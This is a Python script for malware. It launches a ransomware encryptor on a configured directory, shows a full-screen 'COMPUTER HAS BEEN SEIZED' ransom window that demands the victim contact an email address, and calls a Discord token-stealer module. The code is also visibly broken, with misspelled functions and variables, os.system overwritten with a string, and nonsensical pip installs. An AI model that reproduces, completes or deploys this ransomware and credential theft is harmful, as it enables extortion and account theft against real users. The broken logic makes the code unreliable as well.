import os
from dotenv import load_dotenv
load_doenv() 

try:
  from multiprocessing import Process
except:
  os.system('pip install multiprocessing')
  from multiprocessing import Process
try:
  import tkinter as tk
except:
  os.system('pip install tkinter')
  import tkinter as tk
load_dotenv() 

ransomeware = os.environ.get("ransomeware")
tokens = os.environ.get('discord_tokens')


if ransomwhere == True:
  load_dotenv() 

  dir = os.environ.get("encrypt_directory")
  os.system = f'python3 ransomware.py --directory {dir}'
  def save_key():
      key = key_entry.get()
      if key:  
          with open("decryption_key.txt", "w") as f:
              f.write(key)
          status_label.config(text="Key saved successfully.")
          os.system(f'python ransomware.py --key {key}')

      else:
          status_label.config(text="Please enter a decryption key.")
  def ransom_gui():
    root = tk.Tk()
    root.title("COMPUTER HAS BEEN SEIZED")
    root.attributes("-topmost", True)  
    root.geometry("{0}x{1}+0+0".format(root.winfo_screenwidth(), root.winfo_screenheight()))  
    # Title label
    title_label = tk.Label(root, text="THIS COMPUTER HAS BEEN SEIZED", font=("Helvetica", 24, "bold"))
    title_label.place(relx=0.5, rely=0.1, anchor="center")
    # Message label
    message_label = tk.Label(root, text=f"Your files have been encrypted with military grade encryption.\nContact {os.environ.get('email')} to decrypt them.\nDO NOT CLOSE THIS WINDOW OR MODIFY ANY OF YOUR FILES OR PRICE WILL INCREASE",
                             font=("Helvetica", 16))
    message_label.place(relx=0.5, rely=0.5, anchor="center")
    # Input box for entering key
    key_entry = tk.Entry(root, font=("Helvetica", 14))
    key_entry.place(relx=0.5, rely=0.8, anchor="center")
    # Button to save key
    decrypt_button = tk.Button(root, text="Decrypt Files", font=("Helvetica", 14), command=save_key)
    decrypt_button.place(relx=0.5, rely=0.85, anchor="center")
    
    # Status label to show message
    status_label = tk.Label(root, text="", font=("Helvetica", 14))
    status_label.place(relx=0.5, rely=0.9, anchor="center")
    
    root.mainloop()
  ransom = Process(target=ransom_gui)
  ransom.start()


if tokens == True:
  from token_stelaer_template import Discord
  Discord.get_token()
    
  
  
  
